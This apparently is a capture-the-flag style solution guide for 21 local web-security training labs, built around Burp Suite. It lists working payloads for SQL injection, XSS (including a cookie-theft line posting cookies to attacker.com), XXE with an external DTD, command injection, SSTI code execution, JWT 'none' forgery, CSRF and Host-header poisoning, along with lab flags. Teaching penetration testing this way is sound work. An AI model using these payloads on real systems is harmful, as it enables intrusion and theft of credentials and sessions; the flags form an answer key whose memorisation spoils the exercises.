# Zeroday Academy Labs - Complete Writeup and Solution Guide

## Table of Contents

### Beginner Labs (11 Labs)
1. [SQL Injection Lab](#sql-injection-lab)
2. [Cross-Site Scripting (XSS) Lab](#cross-site-scripting-xss-lab)
3. [Authentication Bypass Lab](#authentication-bypass-lab)
4. [Sensitive Data Exposure Lab](#sensitive-data-exposure-lab)
5. [XML External Entities (XXE) Lab](#xml-external-entities-xxe-lab)
6. [Access Control Lab](#access-control-lab)
7. [Security Misconfiguration Lab](#security-misconfiguration-lab)
8. [Command Injection Lab](#command-injection-lab)
9. [Unauthenticated API Endpoints Lab](#unauthenticated-api-endpoints-lab)
10. [Sensitive Data in API Responses Lab](#sensitive-data-in-api-responses-lab)
11. [Predictable IDs & IDOR Lab](#predictable-ids--idor-lab)

### Intermediate Labs (10 Labs with Bypass Techniques)
12. [Server-Side Template Injection (SSTI) Lab](#server-side-template-injection-ssti-lab)
13. [LDAP Injection Lab](#ldap-injection-lab)
14. [NoSQL Injection Lab](#nosql-injection-lab)
15. [JWT Manipulation Lab](#jwt-manipulation-lab)
16. [Advanced CSRF Lab](#advanced-csrf-lab)
17. [GraphQL Injection Lab](#graphql-injection-lab)
18. [WebSocket Manipulation Lab](#websocket-manipulation-lab)
19. [Race Condition Lab](#race-condition-lab)
20. [HTTP Host Header Injection Lab](#http-host-header-injection-lab)
21. [SSRF via URL Fetcher Lab](#ssrf-via-url-fetcher-lab)

---

## Lab Setup Instructions

### Prerequisites
1. **Burp Suite Professional** (or Community Edition)
2. **Web Browser** configured to use Burp proxy
3. **Zeroday Academy Platform** running locally
4. **Basic knowledge** of web application security

### Burp Suite Configuration
1. Start Burp Suite
2. Go to Proxy → Options
3. Ensure Proxy Listener is running on 127.0.0.1:8080
4. Configure your browser to use the proxy:
   - Firefox: Settings → Network Settings → Manual proxy configuration
   - Chrome: Use proxy extension or command line flags
5. Install Burp's CA certificate in your browser for HTTPS interception

---

## Beginner Labs

### SQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/sqli`

**Objective:** Exploit SQL injection vulnerabilities to extract sensitive data and bypass authentication.

#### Step 1: Initial Reconnaissance
1. Open Burp Suite and ensure proxy interception is ON
2. Navigate to the SQL injection lab URL
3. Observe the banking application interface with multiple tabs:
   - Basic SQLi
   - Union-Based
   - Blind SQLi
   - Auth Bypass

#### Step 2: Basic SQL Injection Discovery
1. In the "Basic SQLi" tab, enter `1` in the User ID field
2. Click "Lookup User" while Burp proxy is intercepting
3. **Burp Action:** Send the request to Repeater (Ctrl+R)
4. In Repeater, modify the `id` parameter to test for injection:
   ```
   GET /api/vuln/sqli?id=1' HTTP/1.1
   ```
5. **Expected Result:** Database error message revealing MySQL backend
6. **Screenshot Location:** Save response showing SQL error

#### Step 3: Union-Based SQL Injection
1. Switch to "Union-Based" tab in the lab
2. Intercept the search request with Burp
3. **Burp Action:** Send to Repeater and test column count:
   ```
   GET /api/vuln/sqli?search=banking' ORDER BY 1-- HTTP/1.1
   GET /api/vuln/sqli?search=banking' ORDER BY 2-- HTTP/1.1
   GET /api/vuln/sqli?search=banking' ORDER BY 3-- HTTP/1.1
   ```
4. Continue until you get an error to determine column count
5. **Union Attack:** Extract database information:
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,database(),version()-- HTTP/1.1
   ```
6. **Screenshot Location:** Save response showing database name and version

#### Step 4: Data Extraction
1. **Extract table names:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1
   ```
2. **Extract column names from users table:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
   ```
3. **Extract user credentials:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- HTTP/1.1
   ```
4. **Screenshot Location:** Save response showing extracted usernames and passwords

#### Step 5: Time-Based Blind SQL Injection
1. Switch to "Blind SQLi" tab
2. **Burp Action:** Send request to Intruder
3. Test time-based injection:
   ```
   GET /api/vuln/sqli?type=blind&input=1' AND SLEEP(5)-- HTTP/1.1
   ```
4. **Burp Observation:** Note response time delay of ~5 seconds
5. **Screenshot Location:** Save Intruder results showing timing differences

#### Step 6: Authentication Bypass
1. Switch to "Auth Bypass" tab
2. **Payload in username field:**
   ```
   admin' OR '1'='1'--
   ```
3. **Payload in password field:**
   ```
   anything
   ```
4. **Burp Action:** Intercept and observe successful authentication bypass
5. **Screenshot Location:** Save response showing successful admin access

---

### Cross-Site Scripting (XSS) Lab

**Lab URL:** `http://localhost:5000/api/vuln/xss`

**Objective:** Exploit reflected, stored, and DOM-based XSS vulnerabilities.

#### Step 1: Reflected XSS Discovery
1. Navigate to XSS lab with Burp proxy enabled
2. Test basic XSS payload in search field:
   ```
   <script>alert('XSS')</script>
   ```
3. **Burp Action:** Intercept request and send to Repeater
4. **URL-encode payload for testing:**
   ```
   GET /api/vuln/xss?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
   ```
5. **Screenshot Location:** Save response showing XSS payload execution

#### Step 2: Filter Bypass Techniques
1. **Test various payloads to bypass filters:**
   ```
   <img src=x onerror=alert('XSS')>
   <svg onload=alert('XSS')>
   <iframe src="javascript:alert('XSS')">
   ```
2. **Burp Action:** Use Intruder to test multiple payloads
3. **Screenshot Location:** Save successful bypass techniques

#### Step 3: Cookie Theft Simulation
1. **Advanced payload for cookie extraction:**
   ```
   <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
   ```
2. **Burp Action:** Show intercepted request with cookie in URL
3. **Screenshot Location:** Save evidence of cookie theft attempt

---

### Authentication Bypass Lab

**Lab URL:** `http://localhost:5000/api/vuln/auth`

**Objective:** Bypass authentication mechanisms using various techniques.

#### Step 1: Credential Testing
1. Access the authentication lab
2. **Burp Action:** Intercept login attempts
3. **Test default credentials:**
   - admin:admin
   - admin:password
   - guest:guest
4. **Screenshot Location:** Save failed authentication responses

#### Step 2: SQL Injection in Authentication
1. **Test SQL injection in login form:**
   ```
   Username: admin' OR '1'='1'--
   Password: anything
   ```
2. **Burp Action:** Analyze response for successful bypass
3. **Screenshot Location:** Save successful authentication bypass

#### Step 3: Parameter Tampering
1. **Burp Action:** Intercept POST request and send to Repeater
2. **Add additional parameters:**
   ```
   POST /api/vuln/auth HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=wrong&admin=true&role=administrator
   ```
3. **Screenshot Location:** Save response showing privilege escalation

---

### Sensitive Data Exposure Lab

**Lab URL:** `http://localhost:5000/api/vuln/data-exposure`

**Objective:** Discover and exploit sensitive data exposure vulnerabilities.

#### Step 1: Directory Traversal
1. **Test path traversal attacks:**
   ```
   GET /api/vuln/data-exposure?file=../../../etc/passwd HTTP/1.1
   GET /api/vuln/data-exposure?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
   ```
2. **Burp Action:** Use various encoding techniques
3. **Screenshot Location:** Save successful file access attempts

#### Step 2: Configuration File Access
1. **Target common configuration files:**
   ```
   GET /api/vuln/data-exposure?file=.env HTTP/1.1
   GET /api/vuln/data-exposure?file=config/database.yml HTTP/1.1
   GET /api/vuln/data-exposure?file=wp-config.php HTTP/1.1
   ```
2. **Screenshot Location:** Save exposed configuration data

---

### XML External Entities (XXE) Lab

**Lab URL:** `http://localhost:5000/api/vuln/xxe`

**Objective:** Exploit XXE vulnerabilities to read local files and perform SSRF attacks.

#### Step 1: Basic XXE File Reading
1. **Submit XML payload:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>
   <data>&xxe;</data>
   </root>
   ```
2. **Burp Action:** Intercept and modify XML requests
3. **Screenshot Location:** Save response showing file contents

#### Step 2: Out-of-Band XXE
1. **Use external DTD for data extraction:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
   <root>
   <data>test</data>
   </root>
   ```
2. **Screenshot Location:** Save evidence of external connection

---

### Access Control Lab

**Lab URL:** `http://localhost:5000/api/vuln/access-control`

**Objective:** Exploit access control flaws including IDOR and privilege escalation.

#### Step 1: Insecure Direct Object Reference (IDOR)
1. **Test user enumeration:**
   ```
   GET /api/vuln/access-control?userId=1 HTTP/1.1
   GET /api/vuln/access-control?userId=2 HTTP/1.1
   GET /api/vuln/access-control?userId=999 HTTP/1.1
   ```
2. **Burp Action:** Use Intruder to enumerate user IDs
3. **Screenshot Location:** Save responses showing different user data

#### Step 2: Privilege Escalation
1. **Test admin panel access:**
   ```
   GET /api/vuln/access-control?action=admin HTTP/1.1
   GET /api/vuln/access-control?role=admin HTTP/1.1
   ```
2. **Screenshot Location:** Save unauthorized admin access

---

### Security Misconfiguration Lab

**Lab URL:** `http://localhost:5000/api/vuln/misconfig`

**Objective:** Identify and exploit security misconfigurations.

#### Step 1: Debug Information Exposure
1. **Enable debug mode:**
   ```
   GET /api/vuln/misconfig?debug=true HTTP/1.1
   GET /api/vuln/misconfig?debug=1 HTTP/1.1
   ```
2. **Screenshot Location:** Save debug information exposure

#### Step 2: Default Credentials
1. **Test default administrative credentials**
2. **Burp Action:** Document weak password policies
3. **Screenshot Location:** Save successful default credential access

---

### Command Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/command`

**Objective:** Exploit command injection vulnerabilities for remote code execution.

#### Step 1: Basic Command Injection
1. **Test command injection in ping utility:**
   ```
   POST /api/vuln/command HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   ping=127.0.0.1; ls -la
   ```
2. **Burp Action:** Test various command separators (;, &&, ||, |)
3. **Screenshot Location:** Save command execution results

#### Step 2: Filter Bypass
1. **Test bypass techniques:**
   ```
   ping=127.0.0.1$(cat /etc/passwd)
   ping=127.0.0.1`whoami`
   ping=127.0.0.1%0Als%20-la
   ```
2. **Screenshot Location:** Save successful bypass attempts

---

## Intermediate Labs

### Server-Side Template Injection (SSTI) Lab

**Lab URL:** `http://localhost:5000/api/vuln/ssti`

**Objective:** Exploit SSTI vulnerabilities for remote code execution with bypass techniques.

#### Step 1: Template Engine Detection
1. **Test basic SSTI payloads:**
   ```
   {{7*7}}
   ${7*7}
   #{7*7}
   ```
2. **Screenshot Location:** Save response showing mathematical evaluation

#### Step 2: Code Execution
1. **Node.js SSTI payload:**
   ```
   {{constructor.constructor('return process.env')()}}
   ```
2. **Screenshot Location:** Save environment variable exposure

#### Step 3: WAF Bypass - Alternate Delimiters ⭐
**Bypass Technique:** Use alternate delimiter syntax to bypass WAF filters
1. **Payload with {% %} delimiters:**
   ```
   {%print(7*7)%}
   ```
2. **Flag:** `{SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}`
3. **Screenshot Location:** Save successful bypass response

#### Step 4: Filter Evasion - Attribute Chain Bypass ⭐
**Bypass Technique:** Use attribute chaining to access dangerous functions
1. **Payload with attribute access:**
   ```
   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
   ```
2. **Flag:** `{SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}`
3. **Screenshot Location:** Save RCE evidence

---

### LDAP Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/ldap-injection`

**Objective:** Exploit LDAP injection vulnerabilities with bypass techniques.

#### Step 1: Authentication Bypass
1. **LDAP injection payloads:**
   ```
   *)(uid=*))(|(uid=*
   admin)(&(password=*))
   ```
2. **Screenshot Location:** Save authentication bypass evidence

#### Step 2: Wildcard Filter Bypass ⭐
**Bypass Technique:** Use wildcard character to dump directory entries
1. **Payload:**
   ```
   username=*
   ```
2. **Burp Action:** Intercept search request, modify username to `*`
3. **Flag:** `{LDAP_INJECTION_WILDCARD_BYPASS}`
4. **Screenshot Location:** Save directory dump showing all users

---

### NoSQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/nosql-injection`

**Objective:** Exploit NoSQL injection in MongoDB-style queries with advanced operators.

#### Step 1: Authentication Bypass
1. **NoSQL injection payloads:**
   ```
   {"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}
   {"username": {"$regex": ".*"}, "password": {"$ne": ""}}
   ```
2. **Screenshot Location:** Save successful bypass

#### Step 2: $gt Operator Bypass ⭐
**Bypass Technique:** Use greater-than operator for authentication bypass
1. **Payload:** `username={"$gt":""}`
2. **Flag:** `{NOSQL_GT_OPERATOR_BYPASS}`

#### Step 3: $regex Operator Bypass ⭐
**Bypass Technique:** Use regex for pattern-based bypass
1. **Payload:** `username={"$regex":"^a"}`
2. **Flag:** `{NOSQL_REGEX_INJECTION}`

#### Step 4: $where JavaScript Execution ⭐
**Bypass Technique:** Execute JavaScript via $where clause
1. **Payload:** `username={"$where":"1==1"}`
2. **Flag:** `{NOSQL_WHERE_CODE_EXECUTION}`
3. **Screenshot Location:** Save all bypass methods

---

### JWT Manipulation Lab

**Lab URL:** `http://localhost:5000/api/vuln/jwt-manipulation`

**Objective:** Exploit JWT vulnerabilities including algorithm confusion and bypass techniques.

#### Step 1: Algorithm Confusion
1. **Change RS256 to HS256 in JWT header**
2. **Use public key as HMAC secret**
3. **Screenshot Location:** Save successful token manipulation

#### Step 2: "none" Algorithm Bypass ⭐
**Bypass Technique:** Remove signature verification by using "none" algorithm
1. **Modify JWT header:**
   ```json
   {"alg":"none","typ":"JWT"}
   ```
   Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
   
2. **Modify JWT payload:**
   ```json
   {"sub":"1234567890","name":"Guest","admin":true}
   ```
   Base64: `eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9`
   
3. **Final token (note trailing dot, no signature):**
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9.
   ```
   
4. **Flag:** `{JWT_NONE_ALGORITHM_BYPASS}`
5. **Screenshot Location:** Save admin access evidence

---

### Advanced CSRF Lab

**Lab URL:** `http://localhost:5000/api/vuln/csrf-advanced`

**Objective:** Exploit advanced CSRF vulnerabilities with SameSite bypass.

#### Step 1: Token Bypass
1. **Create malicious HTML page with CSRF payload**
2. **Test SameSite cookie bypass techniques**
3. **Screenshot Location:** Save successful CSRF execution

#### Step 2: SameSite=None Cookie Bypass ⭐
**Bypass Technique:** Exploit SameSite=None cookies in cross-site requests
1. **Analyze cookie:** `Set-Cookie: csrf_session=user_123; SameSite=None`
2. **Create evil.html:**
   ```html
   <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
     <input type="hidden" name="recipient" value="attacker@evil.com">
     <input type="hidden" name="amount" value="10000">
     <input type="hidden" name="csrf_token" id="token">
   </form>
   <script>
     const timestamp = Math.floor(Date.now() / 1000);
     document.getElementById('token').value = 'csrf_' + timestamp;
     document.getElementById('csrf').submit();
   </script>
   ```
3. **Host on different origin:** `python3 -m http.server 8000`
4. **Flag:** `{CSRF_SAMESITE_BYPASS_SUCCESSFUL}`
5. **Screenshot Location:** Save successful transfer evidence

---

### GraphQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/graphql-injection`

**Objective:** Exploit GraphQL injection and introspection vulnerabilities with bypass techniques.

#### Step 1: Schema Introspection
1. **GraphQL introspection query:**
   ```graphql
   query IntrospectionQuery {
     __schema {
       queryType { name }
       mutationType { name }
       types {
         name
         fields {
           name
           type { name }
         }
       }
     }
   }
   ```
2. **Screenshot Location:** Save schema information

#### Step 2: Introspection Bypass ⭐
**Bypass Technique:** Query schema when introspection "disabled"
1. **Simple introspection:** `{__schema{types{name}}}`
2. **Flag:** `{GRAPHQL_INTROSPECTION_BYPASS}`

#### Step 3: Query Batching Bypass ⭐
**Bypass Technique:** Extract multiple resources in single request
1. **Batch query:** `[{users{id}},{posts{title}}]`
2. **Flag:** `{GRAPHQL_BATCH_QUERY_BYPASS}`

#### Step 4: Depth Limit Bypass ⭐
**Bypass Technique:** Deeply nested queries to access sensitive data
1. **Deep nesting:** `{users{posts{comments{author{posts{comments{id}}}}}}}`
2. **Flag:** `{GRAPHQL_DEPTH_LIMIT_BYPASS}`

#### Step 5: __typename Disclosure ⭐
**Bypass Technique:** Use __typename to discover field types
1. **Type disclosure:** `{users{id,username,__typename}}`
2. **Flag:** `{GRAPHQL_TYPENAME_DISCLOSURE}`
3. **Screenshot Location:** Save all bypass methods

---

### WebSocket Manipulation Lab

**Lab URL:** `http://localhost:5000/api/vuln/websocket-manipulation`

**Objective:** Exploit WebSocket vulnerabilities through message manipulation and origin bypass.

#### Step 1: Message Interception
1. **Use Burp to intercept WebSocket traffic**
2. **Modify messages in real-time**
3. **Screenshot Location:** Save manipulated WebSocket messages

#### Step 2: Origin Validation Bypass ⭐
**Bypass Technique:** Bypass weak origin validation with substring matching
1. **Burp Action:** Intercept WebSocket upgrade request
2. **Modify Origin header to:** `http://evil.trusted.com` or `http://trusted-attacker.com`
3. **Server accepts due to substring match on "trusted"**
4. **Flag:** `{WEBSOCKET_ORIGIN_VALIDATION_BYPASS}`
5. **Screenshot Location:** Save successful WebSocket connection from malicious origin

---

### Race Condition Lab

**Lab URL:** `http://localhost:5000/api/vuln/race-condition`

**Objective:** Exploit race condition vulnerabilities with TOCTOU bypass.

#### Step 1: Concurrent Request Testing
1. **Use Burp Turbo Intruder for simultaneous requests**
2. **Target balance transfer or similar operations**
3. **Screenshot Location:** Save evidence of race condition exploitation

#### Step 2: TOCTOU Bypass ⭐
**Bypass Technique:** Time-of-Check-Time-of-Use exploitation
1. **Burp Repeater Method:** Send to Repeater → Create tab group with 20 copies → Send group in parallel
2. **Burp Intruder Method:**
   - Payload type: Null payloads (50 payloads)
   - Resource Pool: 50 concurrent requests
   - Exploit time gap between validation and usage
3. **Expected Result:** Multiple $50 discounts applied, balance > $150
4. **Flag:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`
5. **Screenshot Location:** Save balance showing multiple discount applications

---

### HTTP Host Header Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/host-header-injection`

**Objective:** Exploit Host header injection for cache poisoning and password reset attacks.

#### Step 1: Header Manipulation
1. **Modify Host header:**
   ```
   Host: evil.com
   X-Forwarded-Host: evil.com
   X-Host: evil.com
   ```
2. **Screenshot Location:** Save successful header injection

#### Step 2: X-Forwarded-Host Bypass ⭐
**Bypass Technique:** Use X-Forwarded-Host for password reset poisoning
1. **Burp Action:** Intercept password reset POST request
2. **Add header:** `X-Forwarded-Host: evil.com`
3. **Reset link generated with attacker's domain**
4. **Flag:** `{HOST_HEADER_X_FORWARDED_HOST_BYPASS}`

#### Step 3: X-Original-Host Bypass ⭐
**Bypass Technique:** Use alternative X-Original-Host header
1. **Add header:** `X-Original-Host: attacker.com`
2. **Flag:** `{HOST_HEADER_X_ORIGINAL_HOST_BYPASS}`
3. **Screenshot Location:** Save both bypass methods

---

## General Burp Suite Tips for All Labs

### 1. Proxy Configuration
- Always ensure proxy interception is enabled
- Use "Intercept is on" for real-time request modification
- Save interesting requests to Project files

### 2. Essential Burp Tools Usage

#### Repeater Tab
- Send interesting requests to Repeater (Ctrl+R)
- Modify parameters and headers manually
- Test various payloads systematically

#### Intruder Tab
- Use for automated payload testing
- Configure attack types: Sniper, Battering Ram, Pitchfork, Cluster Bomb
- Load wordlists for comprehensive testing

#### Scanner Tab (Pro Version)
- Run automated vulnerability scans
- Review detailed vulnerability reports
- Validate manual findings

#### Target Tab
- Map application structure
- Identify all endpoints and parameters
- Use site map for comprehensive testing

### 3. Request/Response Analysis
- Always review HTTP headers carefully
- Look for error messages that reveal system information
- Note unusual response times (potential for blind attacks)
- Check for reflected user input in responses

### 4. Session Management
- Test session token randomness
- Check for session fixation vulnerabilities
- Verify proper session termination

### 5. Documentation Best Practices
- Take screenshots of all successful exploits
- Document exact payloads used
- Note response codes and error messages
- Record timing information for blind attacks

---

### Unauthenticated API Endpoints Lab

**Lab URL:** `http://localhost:5000/api/vuln/api-unauth`

**Objective:** Discover and exploit APIs without authentication checks to access admin functionality, user data, and internal endpoints.

**Key Exploitation Steps:**
1. Enumerate available API actions (users, admin, debug, secret)
2. Access user data without authentication → `FLAG{api_unauth_users_exposed}`
3. Access admin panel and secret keys → `FLAG{unauth_admin_access_2024}`
4. Find debug endpoints → `FLAG{debug_endpoint_exposed}`
5. Discover secret endpoints → `FLAG{api_secret_data_leak}`

**Full walkthrough:** See BEGINNER_LABS_WALKTHROUGH.md, Lab #9

---

### Sensitive Data in API Responses Lab

**Lab URL:** `http://localhost:5000/api/vuln/api-sensitive-data`

**Objective:** Analyze API responses to identify leaked credentials, passwords, configuration data, and verbose error messages.

**Key Exploitation Steps:**
1. Extract profile data with password hashes and SSN → `FLAG{api_profile_data_leak}`
2. Trigger verbose errors exposing database queries → `FLAG{verbose_error_messages}`
3. Access configuration endpoints with API keys → `FLAG{config_exposure_critical}`

**Full walkthrough:** See BEGINNER_LABS_WALKTHROUGH.md, Lab #10

---

### Predictable IDs & IDOR Lab

**Lab URL:** `http://localhost:5000/api/vuln/api-predictable-ids`

**Objective:** Exploit sequential IDs to access unauthorized user profiles, invoices, and confidential documents (Insecure Direct Object Reference).

**Key Exploitation Steps:**
1. Enumerate users via predictable userIds (1001-1010) → `FLAG{idor_user_profile_access}`
2. Access other users' invoices → `FLAG{idor_invoice_access}`
3. Access confidential salary reports → `FLAG{idor_confidential_doc}`
4. Extract API keys backup → `FLAG{idor_master_flag}`
5. Access database dumps → `FLAG{idor_database_dump}`

**Full walkthrough:** See BEGINNER_LABS_WALKTHROUGH.md, Lab #11

---

### SSRF via URL Fetcher Lab

**Lab URL:** `http://localhost:5000/api/vuln/ssrf`

**Objective:** Exploit Server-Side Request Forgery to access internal services, cloud metadata endpoints, and local files using advanced bypass techniques.

**Key Exploitation Steps:**
1. Access localhost internal APIs → `FLAG{ssrf_localhost_access}`
2. Enumerate internal network → `FLAG{ssrf_internal_network_access}`
3. Extract AWS IAM credentials → `FLAG{ssrf_aws_metadata_exfiltration}` ⭐
4. Access GCP metadata → `FLAG{ssrf_gcp_metadata_access}` ⭐
5. Access Azure metadata → `FLAG{ssrf_azure_metadata_exposed}` ⭐
6. Bypass URL filters with IP encoding → `FLAG{ssrf_ip_encoding_bypass}` ⭐
7. Read local files via file:// protocol → `FLAG{ssrf_file_protocol_access}` ⭐

**Full walkthrough:** See INTERMEDIATE_LABS_WALKTHROUGH.md, Lab #10

---

## Conclusion

This comprehensive writeup covers all 21 labs (11 beginner + 10 intermediate) in the Zeroday Academy platform. Each intermediate lab includes intermediate-level bypass techniques marked with ⭐. Practice these exercises in the controlled environment to build your penetration testing skills.

Remember to:
1. Always use Burp Suite systematically
2. Document your findings thoroughly
3. Understand the underlying vulnerability principles
4. Practice responsible disclosure in real-world scenarios

For questions or additional guidance, refer to the OWASP Testing Guide and web application security documentation.

---

**Lab Platform:** Zeroday Academy  
**Version:** 1.0  
**Last Updated:** January 2025  
**Author:** Security Research Team